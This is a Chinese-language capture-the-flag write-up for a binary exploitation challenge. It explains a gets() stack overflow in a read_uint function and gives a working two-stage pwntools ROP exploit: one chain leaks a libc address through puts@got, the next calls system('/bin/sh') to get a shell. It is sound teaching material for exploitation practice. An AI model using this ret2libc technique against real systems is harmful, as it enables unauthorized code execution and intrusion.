# impossible

## 题目简述

函数 `read_uint()` 在 32 字节栈缓冲区上调用 `gets()`，返回地址偏移为 `0x28`。NX 开启且主程序没有直接可用的 Shell 函数，因此官方解法先借助该函数自身泄露 libc 地址，再发送第二条 ret2libc ROP 链。

## 解题过程

`read_uint(char *prompt)` 的第一步是 `puts(prompt)`，随后才执行 `gets(buf)`：

```c
uint read_uint(char *prompt) {
    puts(prompt);
    char buf[0x20];
    gets(buf);
    return strtoul(buf, NULL, 10);
}
```

第一条 ROP 链调用 `read_uint(puts@got)`。这样 `puts(prompt)` 会把 GOT 中已经解析的 `puts` 指针当作字符串输出，泄露其低 6 字节；紧接着同一次函数调用中的 `gets()` 又提供第二次溢出机会：

```python
elf = ELF("dist/impossible.bin")
libc = ELF("dist/libc-2.31.so")

rop1 = ROP(elf)
rop1.read_uint(elf.got["puts"])
p.sendlineafter(b"a >> \n", flat({0x28: rop1.chain()}))

puts_addr = u64(p.recvn(6).ljust(8, b"\x00"))
libc.address = puts_addr - libc.symbols["puts"]

rop2 = ROP(libc)
rop2.system(next(libc.search(b"/bin/sh\x00")))
p.sendline(flat({0x28: rop2.chain()}))
```

Shell 中读取到：

```text
greyhats{4dDl3d_189df1}
```

## 方法总结

没有现成的 `puts(puts@got)` 调用序列时，可以复用带字符串参数的程序函数作为泄露包装器。本题尤其巧妙之处是 `read_uint` 同时完成“先打印参数、后再次读取”，把信息泄露和第二阶段写入串在一条调用链中。计算 libc 基址时必须使用附件配套的 libc。
